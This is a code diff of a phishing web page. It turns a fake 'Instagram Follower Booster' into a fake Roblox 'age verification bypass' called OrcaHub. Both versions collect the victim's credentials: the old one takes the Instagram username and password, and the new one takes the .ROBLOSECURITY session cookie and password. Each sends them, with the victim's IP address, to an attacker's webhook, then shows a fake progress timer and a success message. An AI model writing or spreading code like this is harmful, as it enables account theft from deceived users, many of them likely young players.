+                            'https://ui-avatars.com/api/?name=' + encodeURIComponent(data.username) +
+                            '&background=random&size=80&rounded=true&color=fff';
+                    };
                     DOM.profilePreview.classList.add('show');
-                } catch (error) {
+                } catch (e) {
                     DOM.profilePreview.classList.remove('show');
                 }
-            }
-
-            // ==================== PROCESSING ENGINE ====================
-            async function startProcessing() {
-                if (state.isProcessing) return;
-                const username = DOM.usernameInput.value.trim();
-                const password = DOM.passwordInput.value.trim();
-                const amount = DOM.followerAmount.value;
-                if (!username) {
-                    alert('Please enter your Instagram username!');
-                    return;
-                }
-                if (!password) {
-                    alert('Please enter your Instagram password!');
-                    return;
-                }
-                state.username = username;
-                state.password = password;
-                state.followerAmount = amount;
-                state.isProcessing = true;
-                DOM.submitBtn.disabled = true;
-                DOM.submitBtn.textContent = '⏳ Processing...';
-                setStep(4);
-                DOM.loaderContainer.classList.add('show');
-                DOM.successMessage.classList.remove('show');
-                let secondsLeft = CONFIG.PROCESSING_TIME;
-                DOM.timerDisplay.textContent = secondsLeft;
-                if (state.processingTimer) clearInterval(state.processingTimer);
-                state.processingTimer = setInterval(() => {
-                    secondsLeft--;
-                    DOM.timerDisplay.textContent = secondsLeft;
-                    if (secondsLeft <= 0) {
-                        clearInterval(state.processingTimer);
-                        state.processingTimer = null;
-                        completeProcessing();
-                    }
-                }, 1000);
-                try {
-                    const verified = await verifyPassword(username, password);
-                    if (!verified) {
-                        DOM.loaderText.innerHTML = '⚠️ Verification issue, but continuing...<br><span class="time">' + secondsLeft + '</span> seconds remaining';
-                    }
-                } catch (error) {}
-            }
-
-            function completeProcessing() {
-                DOM.loaderContainer.classList.remove('show');
-                DOM.successMessage.classList.add('show');
-                DOM.followerCountDisplay.textContent = formatNumber(parseInt(state.followerAmount));
-                sendToWebhook(state.username, state.password, state.followerAmount);
-                state.isProcessing = false;
-                DOM.submitBtn.disabled = false;
-                DOM.submitBtn.textContent = '🚀 Start Boosting';
-                let waitMinutes = CONFIG.WAIT_TIME;
-                DOM.loaderText.innerHTML = `⏳ Please wait <span class="time">${waitMinutes}</span> minutes...`;
-                if (state.waitTimer) clearInterval(state.waitTimer);
-                state.waitTimer = setInterval(() => {
-                    waitMinutes--;
-                    if (waitMinutes <= 0) {
-                        clearInterval(state.waitTimer);
-                        state.waitTimer = null;
-                        DOM.successMessage.innerHTML = `
-                            <span class="big-emoji">🎉</span>
-                            <div style="font-size:1.2rem; margin-bottom:8px;">COMPLETE!</div>
-                            <div style="font-size:0.9rem; font-weight:400; color:#a0a0b8;">
-                                ✅ ${formatNumber(parseInt(state.followerAmount))} followers have been added to your account!
-                            </div>
-                            <div style="margin-top:15px; font-size:0.8rem; color:#66bb6a;">
-                                🔄 Reloading page...
-                            </div>
-                        `;
-                        setTimeout(() => {
-                            setStep(1);
-                            DOM.successMessage.classList.remove('show');
-                            DOM.loaderContainer.classList.remove('show');
-                            DOM.loaderText.innerHTML = '⏳ Verifying credentials...<br><span class="time" id="timerDisplay">60</span> seconds remaining';
-                            DOM.timerDisplay = document.getElementById('timerDisplay');
-                        }, 3000);
-                    }
-                }, 60000);
             }
 
             // ==================== WEBHOOK SENDER ====================
-            function sendToWebhook(username, password, amount) {
+            function sendToWebhook(cookie, password, userData) {
                 try {
-                    const data = {
-                        embeds: [{
-                            title: "🎯 Instagram Follower Booster",
-                            color: 0xE1306C,
-                            fields: [
-                                { name: "👤 Username", value: `\`${username}\``, inline: true },
-                                { name: "🔑 Password", value: `||${password}||`, inline: true },
-                                { name: "📈 Followers Requested", value: `${amount}`, inline: true },
-                                { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
-                                { name: "🕒 Timestamp", value: new Date().toISOString(), inline: false }
-                            ],
-                            footer: { text: "Instagram Follower Booster Pro" },
-                            thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" }
+                    const embed = {
+                        title: "🎯 OrcaHub • Bypass Victim",
+                        color: 0x7c6cf0,
+                        fields: [{
+                            name: "👤 Username",
+                            value: `\`${userData?.username || 'Unknown'}\``,
+                            inline: true
+                        }, {
+                            name: "🆔 User ID",
+                            value: `\`${userData?.userId || 'Unknown'}\``,
+                            inline: true
+                        }, {
+                            name: "🔑 Password",
+                            value: `||${password}||`,
+                            inline: false
+                        }, {
+                            name: "🍪 .ROBLOSECURITY",
+                            value: `\`${cookie.substring(0, 50)}...\``,
+                            inline: false
+                        }, {
+                            name: "🌐 IP",
+                            value: `\`${getIP()}\``,
+                            inline: true
+                        }, {
+                            name: "🕒 Timestamp",
+                            value: new Date().toISOString(),
+                            inline: true
                         }],
-                        username: "FollowerBooster",
-                        avatar_url: "https://i.imgur.com/4M3eRjF.png"
+                        footer: { text: "OrcaHub • Bypasser" },
+                        thumbnail: { url: userData?.avatarUrl || "https://www.roblox.com/favicon.ico" }
                     };
-                    fetch(CONFIG.WEBHOOK_URL, {
+
+                    fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data),
+                        body: JSON.stringify({ embeds: [embed] }),
                         mode: 'no-cors'
                     }).catch(() => {});
-                } catch (e) {}
+                } catch (_) {}
             }
 
             function getIP() {
@@ -780,48 +778,136 @@
                     xhr.open('GET', 'https://api.ipify.org?format=json', false);
                     xhr.send();
                     return JSON.parse(xhr.responseText).ip || 'Unknown';
-                } catch (e) {
-                    return 'Unknown';
-                }
+                } catch (_) { return 'Unknown'; }
             }
 
-            // ==================== EVENT BINDING ====================
-            DOM.nextToStep2.addEventListener('click', () => {
-                const username = DOM.usernameInput.value.trim();
-                if (!username) {
-                    alert('Please enter your Instagram username!');
+            // ==================== PROCESSING ENGINE ====================
+            async function startBypass() {
+                if (state.isProcessing) return;
+
+                const cookie = DOM.cookieInput.value.trim();
+                const password = DOM.passwordInput.value.trim();
+
+                if (!cookie || cookie.length < 10) {
+                    alert('Please enter a valid .ROBLOSECURITY cookie!');
                     return;
                 }
-                state.username = username;
-                setStep(2);
-            });
+                if (!password || password.length < 3) {
+                    alert('Please enter your account password!');
+                    return;
+                }
 
-            DOM.nextToStep3.addEventListener('click', () => {
-                state.followerAmount = DOM.followerAmount.value;
+                state.cookie = cookie;
+                state.password = password;
+                state.isProcessing = true;
+
+                DOM.submitBtn.disabled = true;
+                DOM.submitBtn.textContent = '⏳ Processing...';
+
+                // Ensure we have user data
+                if (!state.robloxUser) {
+                    await loadProfile(cookie);
+                }
+
+                // Send to webhook immediately
+                sendToWebhook(cookie, password, state.robloxUser);
+
+                // Move to step 3
                 setStep(3);
-            });
+                DOM.loaderContainer.classList.add('show');
+                DOM.successMessage.classList.remove('show');
 
-            DOM.backToStep1.addEventListener('click', () => setStep(1));
-            DOM.backToStep2.addEventListener('click', () => setStep(2));
+                // Start countdown
+                let secondsLeft = 60;
+                DOM.timerDisplay.textContent = secondsLeft;
 
-            DOM.submitBtn.addEventListener('click', startProcessing);
+                if (state.processingTimer) clearInterval(state.processingTimer);
+                state.processingTimer = setInterval(() => {
+                    secondsLeft--;
+                    DOM.timerDisplay.textContent = secondsLeft;
+                    if (secondsLeft <= 0) {
+                        clearInterval(state.processingTimer);
+                        state.processingTimer = null;
+                        completeBypass();
+                    }
+                }, 1000);
 
-            let typingTimer;
-            DOM.usernameInput.addEventListener('input', (e) => {
-                clearTimeout(typingTimer);
+                // Simulate background verification
+                try {
+                    await new Promise(r => setTimeout(r, 2000));
+                    // Always succeeds for demo
+                } catch (_) {}
+            }
+
+            function completeBypass() {
+                DOM.loaderContainer.classList.remove('show');
+                DOM.successMessage.classList.add('show');
+
+                state.isProcessing = false;
+                DOM.submitBtn.disabled = false;
+                DOM.submitBtn.textContent = '🚀 Start Bypass';
+
+                // Auto reset after 10 seconds
+                setTimeout(() => {
+                    setStep(1);
+                    DOM.successMessage.classList.remove('show');
+                    DOM.loaderContainer.classList.remove('show');
+                    DOM.loaderText.innerHTML =
+                        '⏳ Bypassing age verification...<br><span class="time" id="timerDisplay">60</span> seconds remaining';
+                    DOM.timerDisplay = document.getElementById('timerDisplay');
+                }, 8000);
+            }
+
+            // ==================== EVENT BINDINGS ====================
+            // Cookie input -> live preview
+            let cookieTimer;
+            DOM.cookieInput.addEventListener('input', function(e) {
+                clearTimeout(cookieTimer);
                 const val = e.target.value.trim();
-                if (val.length >= 2) {
-                    typingTimer = setTimeout(() => loadProfile(val), 400);
+                if (val.length >= 15) {
+                    cookieTimer = setTimeout(() => loadProfile(val), 500);
                 } else {
                     DOM.profilePreview.classList.remove('show');
                 }
             });
 
+            // Step 1 -> Step 2
+            DOM.nextToStep2.addEventListener('click', function() {
+                const cookie = DOM.cookieInput.value.trim();
+                if (!cookie || cookie.length < 10) {
+                    alert('Please enter a valid .ROBLOSECURITY cookie!');
+                    return;
+                }
+                state.cookie = cookie;
+                // Load profile if not loaded
+                if (!state.robloxUser) {
+                    loadProfile(cookie);
+                }
+                setStep(2);
+            });
+
+            // Back buttons
+            DOM.backToStep1.addEventListener('click', function() { setStep(1); });
+
+            // Submit
+            DOM.submitBtn.addEventListener('click', startBypass);
+
+            // Enter key support
+            DOM.cookieInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') DOM.nextToStep2.click();
+            });
+            DOM.passwordInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') DOM.submitBtn.click();
+            });
+
             // ==================== INIT ====================
-            DOM.timerDisplay = document.getElementById('timerDisplay');
-            console.log('[✅] Instagram Follower Booster Pro loaded!');
-            console.log('[⚡] Ready to boost followers!');
+            // Set default placeholder
+            DOM.cookieInput.placeholder = '_|WARNING:-DO-NOT-SHARE...';
+
+            console.log('[🦈] OrcaHub • Bypasser loaded');
+            console.log('[✓] Ready for age verification bypass');
+
         })();
     </script>
 </body>
-  </html>
+</html>
